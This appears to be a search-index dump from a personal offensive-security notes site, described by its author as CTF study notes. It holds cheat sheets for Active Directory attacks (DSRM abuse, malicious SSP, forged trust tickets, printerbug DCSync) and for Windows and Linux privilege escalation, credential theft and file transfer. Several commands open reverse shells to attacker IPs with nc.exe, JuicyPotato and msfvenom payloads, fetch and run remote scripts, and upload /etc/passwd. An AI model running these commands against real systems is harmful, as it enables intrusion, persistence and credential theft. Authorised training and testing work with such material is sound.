<pre><code>#Dump DSRM password (needs DA privs):\nInvoke-Mimikatz -Command '\"token::elevate\" \"lsadump::sam\"' -ComputerName &lt;DC's Name&gt;\n\n#This is a local account, so we can PTH and authenticate!\n#BUT we need to alter the behaviour of the DSRM account before pth:\n#Connect on DC:\nEnter-PSSession -ComputerName &lt;DC's Name&gt;\n\n#Alter the Logon behaviour on registry:\nNew-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehaviour\" -Value 2 -PropertyType DWORD -Verbose\n\n#If the property already exists:\nSet-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehaviour\" -Value 2 -Verbose\n</code></pre> <p>Then just PTH to get local admin access on DC!</p>","title":"DSRM Abuse"},{"location":"cheat_sheets/active_directory/exploitation/#custom-ssp","text":"<p>What's that?  We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!</p> <p>From powershell:</p> <pre><code>#Get current Security Package:\n$packages = Get-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\\\" -Name 'Security Packages' | select -ExpandProperty  'Security Packages'\n\n#Append mimilib:\n$packages += \"mimilib\"\n\n#Change the new packages name\nSet-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\\\" -Name 'Security Packages' -Value $packages\nSet-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name 'Security Packages' -Value $packages\n\n#ALTERNATIVE:\nInvoke-Mimikatz -Command '\"misc::memssp\"'\n</code></pre> <p>Now all logons on the DC are logged to -&gt; C:\\Windows\\System32\\kiwissp.log</p>","title":"Custom SSP"},{"location":"cheat_sheets/active_directory/exploitation/#cross-forest-attacks","text":"","title":"Cross Forest Attacks"},{"location":"cheat_sheets/active_directory/exploitation/#trust-tickets","text":"<p>What's that? If we have Domain Admin rights on a Domain that has Bidirectional Trust relationship with an other forest we can get the Trust key and forge our own inter-realm TGT.</p> <p> The access we will have will be limited to what our DA account is configured to have on the other Forest!</p> <ul> <li>Using Mimikatz:</li> </ul> <pre><code>#Dump the trust key\nInvoke-Mimikatz -Command '\"lsadump::trust /patch\"'\nInvoke-Mimikatz -Command '\"lsadump::lsa /patch\"'\n\n#Forge an inter-realm TGT using the Golden Ticket attack\nInvoke-Mimikatz -Command '\"kerberos::golden /user:Administrator /domain:&lt;OurDomain&gt; /sid:\n&lt;OurDomainSID&gt; /rc4:&lt;TrustKey&gt; /service:krbtgt /target:&lt;TheTargetDomain&gt; /ticket:\n&lt;PathToSaveTheGoldenTicket&gt;\"'\n</code></pre> <p> Tickets -&gt; .kirbi format</p> <p>Then Ask for a TGS to the external Forest for any service using the inter-realm TGT and access the resource!</p> <ul> <li>Using Rubeus:</li> </ul> <pre><code>.\\Rubeus.exe asktgs /ticket:&lt;kirbi file&gt; /service:\"Service's SPN\" /ptt\n</code></pre>","title":"Trust Tickets"},{"location":"cheat_sheets/active_directory/exploitation/#abuse-mssql-servers","text":"<ul> <li>Enumerate MSSQL Instances: <code>Get-SQLInstanceDomain</code></li> <li>Check Accessibility as current user:</li> </ul> <pre><code>Get-SQLConnectionTestThreaded\nGet-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose\n</code></pre> <ul> <li>Gather Information about the instance: <code>Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose</code></li> <li>Abusing SQL Database Links: \\   WUT IS DIS?: A database link allows a SQL Server to access other resources like other SQL Server. If we have two linked SQL Servers we can execute stored procedures in them. Database links also works across Forest Trust!</li> </ul> <p>Check for existing Database Links:</p> <pre><code>#Check for existing Database Links:\n#PowerUpSQL:\nGet-SQLServerLink -Instance &lt;SPN&gt; -Verbose\n\n#MSSQL Query:\nselect * from master..sysservers\n</code></pre> <p>Then we can use queries to enumerate other links from the linked Database:</p> <pre><code>#Manualy:\nselect * from openquery(\"LinkedDatabase\", 'select * from master..sysservers')\n\n#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):\nGet-SQLServerLinkCrawl -Instance &lt;SPN&gt; -Verbose\n\n#Then we can execute command on the machine's were the SQL Service runs using xp_cmdshell\n#Or if it is disabled enable it:\nEXECUTE('sp_configure \"xp_cmdshell\",1;reconfigure;') AT \"SPN\"\n</code></pre> <p>Query execution:</p> <pre><code>Get-SQLServerLinkCrawl -Instace &lt;SPN&gt; -Query \"exec master..xp_cmdshell 'whoami'\"\n</code></pre>","title":"Abuse MSSQL Servers"},{"location":"cheat_sheets/active_directory/exploitation/#breaking-forest-trusts","text":"<p>What's that? TL;DR \\ If we have a bidirectional trust with an external forest and we manage to compromise a machine on the local forest that has enabled unconstrained delegation (DCs have this by default), we can use the printerbug to force the DC of the external forest's root domain to authenticate to us. Then we can capture it's TGT, inject it into memory and DCsync to dump it's hashes, giving ous complete access over the whole forest.</p> <p>Tools we are going to use:</p> <ul> <li>Rubeus</li> <li>SpoolSample</li> <li>Mimikatz</li> </ul> <p>Exploitation example:</p> <pre><code>#Start monitoring for TGTs with rubeus:\nRubeus.exe monitor /interval:5 /filteruser:target-dc$\n\n#Execute the printerbug to trigger the force authentication of the target DC to our machine\nSpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local\n\n#Get the base64 captured TGT from Rubeus and inject it into memory:\nRubeus.exe ptt /ticket:&lt;Base64ValueofCapturedTicket&gt;\n\n#Dump the hashes of the target domain using mimikatz:\nlsadump::dcsync /domain:external.forest.local /all\n</code></pre> <p>Detailed Articles:</p> <ul> <li>Not A Security Boundary: Breaking Forest Trusts</li> <li>Hunting in Active Directory: Unconstrained Delegation &amp; Forests Trusts</li> </ul>","title":"Breaking Forest Trusts"},{"location":"cheat_sheets/privesc/linux/","text":"Command Description     <code>ssh user@&lt;target IP&gt;</code> SSH to lab target    <code>ps aux \\| grep root</code> See processes running as root   <code>ps au</code> See logged in users   <code>ls /home</code> View user home directories   <code>ls -l ~/.ssh</code> Check for SSH keys for current user   <code>history</code> Check the current user's Bash history   <code>sudo -l</code> Can the user run anything as another user?   <code>ls -la /etc/cron.daily</code> Check for daily Cron jobs   <code>lsblk</code> Check for unmounted file systems/drives   <code>find / -path /proc -prune -o -type d -perm -o+w 2&gt;/dev/null</code> Find world-writeable directories   <code>find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null</code> Find world-writeable files   <code>uname -a</code> Check the Kernel versiion   <code>cat /etc/lsb-release</code> Check the OS version   <code>gcc kernel_expoit.c -o kernel_expoit</code> Compile an exploit written in C   <code>screen -v</code> Check the installed version of <code>Screen</code>   <code>./pspy64 -pf -i 1000</code> View running processes with <code>pspy</code>   <code>find / -user root -perm -4000 -exec ls -ldb {} \\; 2&gt;/dev/null</code> Find binaries with the SUID bit set   <code>find / -user root -perm -6000 -exec ls -ldb {} \\; 2&gt;/dev/null</code> Find binaries with the SETGID bit set   <code>sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</code> Priv esc with <code>tcpdump</code>   <code>echo $PATH</code> Check the current user's PATH variable contents   <code>PATH=.:${PATH}</code> Add a <code>.</code> to the beginning of the current user's PATH   <code>find / ! -path \"*/proc/*\" -iname \"*config*\" -type f 2&gt;/dev/null</code> Search for config files   <code>ldd /bin/ls</code> View the shared objects required by a binary   <code>sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart</code> Escalate privileges using <code>LD_PRELOAD</code>   <code>readelf -d payroll  \\| grep PATH</code> Check the RUNPATH of a binary   <code>gcc src.c -fPIC -shared -o /development/libshared.so</code> Compiled a shared libary   <code>lxd init</code> Start the LXD initialization process   <code>lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</code> Import a local image   <code>lxc init alpine r00t -c security.privileged=true</code> Start a privileged LXD container   <code>lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true</code> Mount the host file system in a container   <code>lxc start r00t</code> Start the container   <code>showmount -e 10.129.2.12</code> Show the NFS export list   <code>sudo mount -t nfs 10.129.2.12:/tmp /mnt</code> Mount an NFS share locally   <code>tmux -S /shareds new -s debugsess</code> Created a shared <code>tmux</code> session socket   <code>./lynis audit system</code> Perform a system audit with <code>Lynis</code>","title":"Linux"},{"location":"cheat_sheets/privesc/windows/","text":"","title":"Windows"},{"location":"cheat_sheets/privesc/windows/#initial-enumeration","text":"Command Description     <code>xfreerdp /v:&lt;target ip&gt; /u:user</code> RDP to lab target   <code>ipconfig /all</code> Get interface, IP address and DNS information   <code>arp -a</code> Review ARP table   <code>route print</code> Review routing table   <code>Get-MpComputerStatus</code> Check Windows Defender status   <code>Get-AppLockerPolicy -Effective \\| select -ExpandProperty RuleCollections</code> List AppLocker rules   <code>Get-AppLockerPolicy -Local \\| Test-AppLockerPolicy -path C:\\Windows\\System32\\cmd.exe -User Everyone</code> Test AppLocker policy   <code>set</code> Display all environment variables   <code>systeminfo</code> View detailed system configuration information   <code>wmic qfe</code> Get patches and updates   <code>wmic product get name</code> Get installed programs   <code>tasklist /svc</code> Display running processes   <code>query user</code> Get logged-in users   <code>echo %USERNAME%</code> Get current user   <code>whoami /priv</code> View current user privileges   <code>whoami /groups</code> View current user group information   <code>net user</code> Get all system users   <code>net localgroup</code> Get all system groups   <code>net localgroup administrators</code> View details about a group   <code>net accounts</code> Get passsword policy   <code>netstat -ano</code> Display active network connections   <code>pipelist.exe /accepteula</code> List named pipes   <code>gci \\\\.\\pipe\\</code> List named pipes with PowerShell   <code>accesschk.exe /accepteula \\\\.\\Pipe\\lsass -v</code> Review permissions on a named pipe","title":"Initial Enumeration"},{"location":"cheat_sheets/privesc/windows/#handy-commands","text":"Command Description     <code>mssqlclient.py sql_dev@10.129.43.30 -windows-auth</code> Connect using mssqlclient.py   <code>enable_xp_cmdshell</code> Enable xp_cmdshell with mssqlclient.py   <code>xp_cmdshell whoami</code> Run OS commands with xp_cmdshell   <code>c:\\tools\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe 10.10.14.3 443 -e cmd.exe\" -t *</code> Escalate privileges with JuicyPotato   <code>c:\\tools\\PrintSpoofer.exe -c \"c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd\"</code> Escalating privileges with PrintSpoofer   <code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code> Take memory dump with ProcDump   <code>sekurlsa::minidump lsass.dmp</code> and <code>sekurlsa::logonpasswords</code> Use MimiKatz to extract credentials from LSASS memory dump   <code>dir /q C:\\backups\\wwwroot\\web.config</code> Checking ownership of a file   <code>takeown /f C:\\backups\\wwwroot\\web.config</code> Taking ownership of a file   <code>Get-ChildItem -Path \u2018C:\\backups\\wwwroot\\web.config\u2019 \\| select name,directory, @{Name=\u201cOwner\u201d;Expression={(Ge t-ACL $_.Fullname).Owner}}</code> Confirming changed ownership of a file   <code>icacls \u201cC:\\backups\\wwwroot\\web.config\u201d /grant user:F</code> Modifying a file ACL   <code>secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL</code> Extract hashes with secretsdump.py   <code>robocopy /B E:\\Windows\\NTDS .\\ntds ntds.dit</code> Copy files with ROBOCOPY   <code>wevtutil qe Security /rd:true /f:text \\| Select-String \"/user\"</code> Searching security event logs   <code>wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 \\| findstr \"/user\"</code> Passing credentials to wevtutil   <code>Get-WinEvent -LogName security \\| where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } \\| Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}</code> Searching event logs with PowerShell   <code>msfvenom -p windows/x64/exec cmd='net group \"domain admins\" netadm /add /domain' -f dll -o adduser.dll</code> Generate malicious DLL   <code>dnscmd.exe /config /serverlevelplugindll adduser.dll</code> Loading a custom DLL with dnscmd   <code>wmic useraccount where name=\"netadm\" get sid</code> Finding a user's SID   <code>sc.exe sdshow DNS</code> Checking permissions on DNS service   <code>sc stop dns</code> Stopping a service   <code>sc start dns</code> Starting a service   <code>reg query \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters</code> Querying a registry key   <code>reg delete \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters  /v ServerLevelPluginDll</code> Deleting a registry key   <code>sc query dns</code> Checking a service status   <code>Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.legalcorp.local</code> Disabling the global query block list   <code>Add-DnsServerResourceRecordA -Name wpad -ZoneName legalcorp.local -ComputerName dc01.legalcorp.local -IPv4Address 10.10.14.3</code> Adding a WPAD record   <code>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp</code> Compile with cl.exe   <code>reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d \"\\??\\C:\\Tools\\Capcom.sys\"</code> Add reference to a driver (1)   <code>reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1</code> Add reference to a driver (2)   <code>.\\DriverView.exe /stext drivers.txt</code> and <code>cat drivers.txt \\| Select-String -pattern Capcom</code> Check if driver is loaded   <code>EoPLoadDriver.exe System\\CurrentControlSet\\Capcom c:\\Tools\\Capcom.sys</code> Using EopLoadDriver   <code>c:\\Tools\\PsService.exe security AppReadiness</code> Checking service permissions with PsService   <code>sc config AppReadiness binPath= \"cmd /c net localgroup Administrators server_adm /add\"</code> Modifying a service binary path   <code>REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA</code> Confirming UAC is enabled   <code>REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v ConsentPromptBehaviorAdmin</code> Checking UAC level   <code>[environment]::OSVersion.Version</code> Checking Windows version   <code>cmd /c echo %PATH%</code> Reviewing path variable   <code>curl http://10.10.14.3:8080/srrstr.dll -O \"C:\\Users\\sarah\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll\"</code> Downloading file with cURL in PowerShell   <code>rundll32 shell32.dll,Control_RunDLL C:\\Users\\sarah\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll</code> Executing custom dll with rundll32.exe   <code>.\\SharpUp.exe audit</code> Running SharpUp   <code>icacls \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\"</code> Checking service permissions with icacls   <code>cmd /c copy /Y SecurityService.exe \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\"</code> Replace a service binary   <code>wmic service get name,displayname,pathname,startmode \\| findstr /i \"auto\" \\| findstr /i /v \"c:\\windows\\\\\" \\| findstr /i /v \"\"\"</code> Searching for unquoted service paths   <code>accesschk.exe /accepteula \"mrb0b\" -kvuqsw hklm\\System\\CurrentControlSet\\services</code> Checking for weak service ACLs in the Registry   <code>Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ModelManagerService -Name \"ImagePath\" -Value \"C:\\Users\\john\\Downloads\\nc.exe -e cmd.exe 10.10.10.205 443\"</code> Changing ImagePath with PowerShell   <code>Get-CimInstance Win32_StartupCommand \\| select Name, command, Location, User \\| fl</code> Check startup programs   <code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe &gt; maintenanceservice.exe</code> Generating a malicious binary   <code>get-process -Id 3324</code> Enumerating a process ID with PowerShell   <code>get-service \\| ? {$_.DisplayName -like 'Druva*'}</code> Enumerate a running service by name with PowerShell","title":"Handy Commands"},{"location":"cheat_sheets/privesc/windows/#credential-theft","text":"Command Description     <code>findstr /SIM /C:\"password\" *.txt *ini *.cfg *.config *.xml</code> Search for files with the phrase \"password\"   <code>gc 'C:\\Users\\user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Custom Dictionary.txt' \\| Select-String password</code> Searching for passwords in Chrome dictionary files   <code>(Get-PSReadLineOption).HistorySavePath</code> Confirm PowerShell history save path   <code>gc (Get-PSReadLineOption).HistorySavePath</code> Reading PowerShell history file   <code>$credential = Import-Clixml -Path 'C:\\scripts\\pass.xml'</code> Decrypting PowerShell credentials   <code>cd c:\\Users\\user\\Documents &amp; findstr /SI /M \"password\" *.xml *.ini *.txt</code> Searching file contents for a string   <code>findstr /si password *.xml *.ini *.txt *.config</code> Searching file contents for a string   <code>findstr /spin \"password\" *.*</code> Searching file contents for a string   <code>select-string -Path C:\\Users\\user\\Documents\\*.txt -Pattern password</code> Search file contents with PowerShell   <code>dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*</code> Search for file extensions   <code>where /R C:\\ *.config</code> Search for file extensions   <code>Get-ChildItem C:\\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore</code> Search for file extensions using PowerShell   <code>cmdkey /list</code> List saved credentials   <code>.\\SharpChrome.exe logins /unprotect</code> Retrieve saved Chrome credentials   <code>.\\lazagne.exe -h</code> View LaZagne help menu   <code>.\\lazagne.exe all</code> Run all LaZagne modules   <code>Invoke-SessionGopher -Target WINLPE-SRV01</code> Running SessionGopher   <code>netsh wlan show profile</code> View saved wireless networks   <code>netsh wlan show profile lcorp_corp key=clear</code> Retrieve saved wireless passwords","title":"Credential Theft"},{"location":"cheat_sheets/privesc/windows/#other-commands","text":"Command Description     <code>certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat</code> Transfer file with certutil   <code>certutil -encode file1 encodedfile</code> Encode file with certutil   <code>certutil -decode encodedfile file2</code> Decode file with certutil   <code>reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer</code> Query for always install elevated registry key (1)   <code>reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer</code> Query for always install elevated registry key (2)   <code>msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi &gt; aie.msi</code> Generate a malicious MSI package   <code>msiexec /i c:\\users\\user\\desktop\\aie.msi /quiet /qn /norestart</code> Executing an MSI package from command line   <code>schtasks /query /fo LIST /v</code> Enumerate scheduled tasks   <code>Get-ScheduledTask \\| select TaskName,State</code> Enumerate scheduled tasks with PowerShell   <code>.\\accesschk64.exe /accepteula -s -d C:\\Scripts\\</code> Check permissions on a directory   <code>Get-LocalUser</code> Check local user description field   <code>Get-WmiObject -Class Win32_OperatingSystem \\| select Description</code> Enumerate computer description field   <code>guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd</code> Mount VMDK on Linux   <code>guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1</code> Mount VHD/VHDX on Linux   <code>sudo python2.7 windows-exploit-suggester.py  --update</code> Update Windows Exploit Suggester database   <code>python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt</code> Running Windows Exploit Suggester","title":"Other Commands"},{"location":"docs/","text":"<p>What is this?</p> <p>This is my personal note archive I created while studying or doing CTFs. This is a work in progress. I will add things, as I come across them.</p>   <p>Disclaimer</p> <p>This is purely educational content - all practical work is done in environments that allow and encourage offensive security training.</p>","title":"Index"},{"location":"documentation_and_reporting/preparation/","text":"<pre><code>mkdir -p &lt;Name&gt;/{Admin,Deliverables,Evidence/{Findings,Scans/{Vuln,Service,Web,'AD Enumeration'},Notes,OSINT,Wireless,'Logging output','Misc Files'},Retest}\n</code></pre>","title":"Preparation"},{"location":"file_analysis/useful_links/","text":"<p>urlscan.io any.run VirusTotal intezer </p>","title":"Useful"},{"location":"file_transfers/catching_files_over_https/","text":"HTTP/S <p>Web transfer is the most common way most people transfer files because <code>HTTP/HTTPS</code> are the most common protocols allowed through firewalls. Another immense benefit is that, in many cases, the file will be encrypted in transit.</p>  Nginx - Enabling PUT <p>Create a Directory to Handle Uploaded Files <pre><code>secops@kali[/kali]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory\n</code></pre></p> <p>Change the Owner to www-data <pre><code>secops@kali[/kali]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory\n</code></pre></p> <p>Create Nginx Configuration File Create the Nginx configuration file by creating the file <code>/etc/nginx/sites-available/upload.conf</code> with the contents: <pre><code>server {\n    listen 9001;\n\n    location /SecretUploadDirectory/ {\n        root    /var/www/uploads;\n        dav_methods PUT;\n    }\n}\n</code></pre></p> <p>Symlink our Site to the sites-enabled Directory <pre><code>secops@kali[/kali]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/\n</code></pre></p> <p>Start Nginx <pre><code>secops@kali[/kali]$ sudo systemctl restart nginx.service\n</code></pre></p> <p>If we get any error messages, check <code>/var/log/nginx/error.log</code>. We might see port 80 is already in use.</p> <p>Verifying Errors <pre><code>secops@kali[/kali]$ tail -2 `/var/log/nginx/error.log`\n\n2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)\n2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()\n</code></pre></p> <pre><code>secops@kali[/kali]$ ss -lnpt | grep `80`\n\nLISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:((\"python\",pid=`2811`,fd=3),(\"python\",pid=2070,fd=3),(\"python\",pid=1968,fd=3),(\"python\",pid=1856,fd=3))\n</code></pre> <pre><code>secops@kali[/kali]$ ps -ef | grep `2811`\n\nuser65      2811    1856  0 16:05 ?        00:00:04 `python -m websockify 80 localhost:5901 -D`\nroot        6720    2226  0 16:14 pts/0    00:00:00 grep --color=auto 2811\n</code></pre> <p>There is already a module listening on port 80. To get around this, we can remove the default Nginx configuration, which binds on port 80.</p> <pre><code>secops@kali[/kali]$ sudo rm /etc/nginx/sites-enabled/default\n</code></pre> <p>Now we can test uploading by using <code>cURL</code> to send a <code>PUT</code> request. In the below example, we will upload the <code>/etc/passwd</code> file to the server and call it users.txt</p> <pre><code>secops@kali[/kali]$ curl -T /etc/passwd \nhttp://localhost:9001/SecretUploadDirectory/users.txt\n</code></pre> <pre><code>secops@kali[/kali]root@localhost# tail -1 /var/www/upload/SecretUploadDirectory/users.txt \n\nuser65:x:1000:1000:,,,:/home/user65:/bin/bash\n</code></pre>","title":"Catching Files over HTTP/S"},{"location":"file_transfers/linux_file_transfer_methods/","text":"<p>Encode SSH Key to Base64</p> <pre><code>secops@kali[/kali]$ cat id_rsa |base64 -w 0;echo\n\nLS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=\n</code></pre> <p>Linux - Decode the File <pre><code>secops@kali[/kali]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d &gt; id_rsa\n</code></pre></p> <p>Linux - Confirm the MD5 Hashes Match</p> <pre><code>secops@kali[/kali]$ md5sum id_rsa\n\n4e301756a07ded0a2dd6953abf015278  id_rsa\n</code></pre>  Web Downloads with Wget an cURL <p>Download a File Using wget <pre><code>secops@kali[/kali]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh\n</code></pre></p> <p>Download a File Using cURL <pre><code>secops@kali[/kali]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\n</code></pre></p>  Fileless Attacks Using Linux <p>Because of the way Linux works and how  pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.</p>  <p>Note: Some payloads such as <code>mkfifo</code> write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload choosen it may create temporary files on the OS.</p>  <p>Fileless Download with cURL</p> <pre><code>secops@kali[/kali]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash\n</code></pre> <p>Similarly, we can download a Python script file from a web server and pipe it into the Python binary.</p> <p>Fileless Download with wget</p> <pre><code>secops@kali[/kali]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3\n\nHello World!\n</code></pre>  Download with Bash (/dev/tcp) <p>There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.</p> <p>Connect to the Target Webserver <pre><code>secops@kali[/kali]$ exec 3&lt;&gt;/dev/tcp/10.10.10.32/80\n</code></pre></p> <p>HTTP GET 